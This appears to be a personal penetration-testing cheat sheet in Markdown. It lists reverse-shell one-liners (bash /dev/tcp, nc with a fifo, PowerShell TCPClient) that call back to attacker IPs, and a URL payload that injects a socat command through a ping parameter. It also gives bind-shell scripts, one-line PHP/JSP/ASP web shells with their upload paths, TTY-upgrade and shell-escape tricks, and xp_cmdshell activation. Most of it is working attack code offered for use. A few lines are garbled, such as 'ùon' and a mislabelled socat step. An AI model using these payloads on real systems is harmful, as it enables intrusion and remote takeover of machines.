#### Reverse-Shell
==Example Prepare Payload==
In a simple _RCE_ we have a payload looks like this.
```bash
socat TCP4:10.10.14.5:4444 EXEC:/bin/bash
```

We have to modify it in according to our needs.
For example in a URL.
```text
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:4444${IFS}EXEC:bash HTTP/1.1
```

==Rapid Payload==
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

==Listener==
_netcat_
```bash
nc -nvlp 4444
```

_pwncat_
```bash
python3 -m pwncat -lp 4444
```

_busybox_
```bash
busybox nc -lp 4444
```

_windows_pty_
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 4444
```

_msfconsole_
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.10; set lport 4444; exploit"
```

_socat_
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
#### Bind Shell
The following are reliable commands we can use to start a bind shell.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <server ip> 7777 > /tmp/f
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

_NetCat Connection_
```bash
nc -nv 10.10.10.1 1234
```

> [!NOTE]
> If we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately.
#### Web Shell
```php
 <?php system($_REQUEST["cmd"]); ?>
```

```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
 <% eval request("cmd") %>
```

_Other Resources_
- [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- [Antak](https://github.com/samratashok/nishang)
- [PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

==Common Upload Path==
#web-server #path

| Web Server | Default Web Root      |
| ---------- | --------------------- |
| Apach      | /var/www/html         |
| Nginx      | /usr/local/nginx/html |
| ISS        | C:\inetpub\wwwroot\   |
| XAMPP      | C:\xampp\htdocs\      |

==Access via curl==
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
#### Upgrade TTY - Linux
_netcat_
Upgrade.
```bash
python -c 'import pty; pty.spawn("/bin/bash")' # For import real tty
```

```bash
^Z

stty raw -echo
fg
```

Full Upgrade
In personal box.
```bash
echo $TERM

stty size
```

In a victim.
```bash
export TERM=[echo $TERM → output]

stty rows 67 columns 318 → based on output of stty size
```

_socat_
We'll start a Socat listener on our attack host.
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Next, we'll execute a Socat one-liner on the target host.
```bash
nc -lnvp 4444
```

If all goes as planned, we'll have a stable reverse shell connection on our *Socat listener*.

_/bin/sh -i_
```bash
/bin/bash -i # interactive mode
```

_Perl_
``` bash
perl: 'exec "/bin/sh";'
```

```bash
perl —e 'exec "/bin/sh";'
```

_Ruby_
```bash
ruby: exec "/bin/bash"
```

_Lua_
```bash
lua: os.execute('/bin/sh')
```

_AWK_
```bash
awk 'BEGIN {system("/bin/sh")}'
```

_Find_
```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```bash
find . -exec /bin/sh \; -quit
```

_Vim_
```bash
vim -c ':!/bin/sh'
```

```bash
vim
:set shell=/bin/sh
:shell
```


#### Command for connect directly
##### RDP
#rdp
```bash
xfreerdp /v:<ip> /u:<users> /p:<password> ùon /drive:<share name>,<path to mount>
```
##### Winrm
#winrm
```bash
evil-winrm -i 10.10.10.10 -u <User> -p '<Password>'
```
##### RPC
#rpc
```bash
rpcclient -U '<User>%<Password>' 10.10.10.10
```
##### MSSQL
#mssql
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Without domain
mssqlclient.py <USERNAME>@<IP> -windows-auth
```

```bash
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
```

###### Enable shell if permited
```bash
SQL> enable_xp_cmdshell # enable the `xp_cmdshell` stored procedure
SQL> xp_cmdshell whoami # confirm access
```